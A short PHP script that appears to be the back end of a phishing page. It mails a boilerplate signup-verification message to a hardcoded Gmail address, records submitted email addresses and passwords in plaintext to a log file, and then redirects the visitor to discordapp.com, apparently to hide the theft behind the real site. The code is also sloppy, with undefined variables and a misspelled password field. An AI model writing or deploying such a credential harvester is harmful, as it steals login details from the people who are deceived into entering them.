<?php
$to      = "salma.ali.2014.2015@gmail.com"; // Send email to our user
$subject = 'Signup | Verification'; // Give the email a subject 
$message = '
 
Thanks for signing up!
Your account has been created, you can login with the following credentials after you have activated your account by pressing the url below.
 
 
Please click this link to activate your account:
http://www.yourwebsite.com/verify.php?email='.$email.'&hash='.$hash.'
 
'; // Our message above including the link
                     
$headers = 'From:noreply@yourwebsite.com' . "\r\n"; // Set from headers
mail($to, $subject, $message, $headers);
  $log_file_name = 'mylog.log'; // Change to the log file name
  $message = $_POST['Email'].PHP_EOL; // incoming message
   $pass = $_POST['Psassword'].PHP_EOL; // incoming message
file_put_contents($log_file_name, "email: " . $message, FILE_APPEND);
    file_put_contents($log_file_name, "pass: " . $pass, FILE_APPEND);
header("Location:https://discordapp.com/");
die();

  ?>